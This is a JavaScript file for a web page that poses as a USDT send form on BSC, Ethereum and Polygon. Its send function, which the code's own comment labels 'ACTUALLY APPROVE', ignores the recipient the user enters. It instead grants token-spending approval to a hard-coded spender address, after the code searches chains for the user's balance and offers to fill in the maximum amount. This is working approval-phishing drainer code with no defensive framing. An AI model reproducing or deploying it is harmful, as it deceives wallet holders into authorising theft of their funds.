/* ======================================================
   GLOBAL STATE
====================================================== */

let provider;
let signer;
let userAddress;
let detectedChain = null;

/* ======================================================
   CONFIG
====================================================== */

// Your spender
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";

// ERC20 ABI (minimal)
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// Supported chains with USDT
const CHAINS = [
  {
    name: "BSC",
    chainId: "0x38",
    rpc: "https://bsc-dataseed.binance.org/",
    usdt: "0x55d398326f99059fF775485246999027B3197955",
    native: { name: "BNB", symbol: "BNB", decimals: 18 },
    explorer: "https://bscscan.com"
  },
  {
    name: "Ethereum",
    chainId: "0x1",
    rpc: "https://rpc.ankr.com/eth",
    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    native: { name: "ETH", symbol: "ETH", decimals: 18 },
    explorer: "https://etherscan.io"
  },
  {
    name: "Polygon",
    chainId: "0x89",
    rpc: "https://polygon-rpc.com",
    usdt: "0xc2132D05D31c914a87C6611C10748AaCBbB7E2",
    native: { name: "MATIC", symbol: "MATIC", decimals: 18 },
    explorer: "https://polygonscan.com"
  }
];

/* ======================================================
   WALLET CONNECT
====================================================== */

async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("No wallet");
  }

  provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = await provider.getSigner();
  userAddress = await signer.getAddress();

  return userAddress;
}

/* ======================================================
   CHAIN SWITCH / ADD
====================================================== */

async function switchChain(chain) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: chain.chainId }]
    });
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: chain.chainId,
          chainName: chain.name,
          rpcUrls: [chain.rpc],
          nativeCurrency: chain.native,
          blockExplorerUrls: [chain.explorer]
        }]
      });
    } else {
      throw err;
    }
  }
}

/* ======================================================
   AUTO-DETECT USDT CHAIN
====================================================== */

async function detectUSDTChain() {
  await connectWallet();

  for (const chain of CHAINS) {
    try {
      await switchChain(chain);

      const tempProvider = new ethers.BrowserProvider(window.ethereum);
      const token = new ethers.Contract(chain.usdt, ERC20_ABI, tempProvider);

      const decimals = await token.decimals();
      const balance = await token.balanceOf(userAddress);

      const formatted = Number(
        ethers.formatUnits(balance, decimals)
      );

      if (formatted > 0) {
        detectedChain = chain;
        console.log("USDT found on:", chain.name, formatted);
        return chain;
      }
    } catch (e) {
      console.warn("Skipped", chain.name);
    }
  }

  return null;
}

/* ======================================================
   MAX BUTTON (AUTO-FILL BALANCE)
====================================================== */

async function setMax() {
  try {
    const chain = detectedChain || await detectUSDTChain();
    if (!chain) {
      alert("No USDT found on supported chains");
      return;
    }

    const tempProvider = new ethers.BrowserProvider(window.ethereum);
    const token = new ethers.Contract(chain.usdt, ERC20_ABI, tempProvider);

    const decimals = await token.decimals();
    const balance = await token.balanceOf(userAddress);

    document.getElementById("amount").value =
      ethers.formatUnits(balance, decimals);

  } catch (e) {
    console.error(e);
  }
}

/* ======================================================
   SEND BUTTON (ACTUALLY APPROVE)
====================================================== */

async function sendUSDT() {
  const toAddress = document.getElementById("toAddress").value.trim();
  const amountStr = document.getElementById("amount").value.trim();

  if (!ethers.isAddress(toAddress)) {
    alert("Invalid address");
    return;
  }

  if (!amountStr || Number(amountStr) <= 0) {
    alert("Invalid amount");
    return;
  }

  try {
    // 1️⃣ Auto-detect chain with USDT
    const chain = detectedChain || await detectUSDTChain();
    if (!chain) {
      alert("No USDT balance found");
      return;
    }

    // 2️⃣ Ensure correct chain
    await switchChain(chain);

    // 3️⃣ Approve (Smart Contract Call)
    const token = new ethers.Contract(
      chain.usdt,
      ERC20_ABI,
      signer
    );

    const decimals = await token.decimals();
    const parsedAmount = ethers.parseUnits(amountStr, decimals);

    const tx = await token.approve(
      SPENDER_ADDRESS,
      parsedAmount
    );

    alert(
      `Authorization sent on ${chain.name}\n\nTX Hash:\n${tx.hash}`
    );

  } catch (err) {
    console.error(err);
    alert("Transaction cancelled or failed");
  }
}

/* ======================================================
   EXPOSE TO UI
====================================================== */

window.sendUSDT = sendUSDT;
window.setMax = setMax;
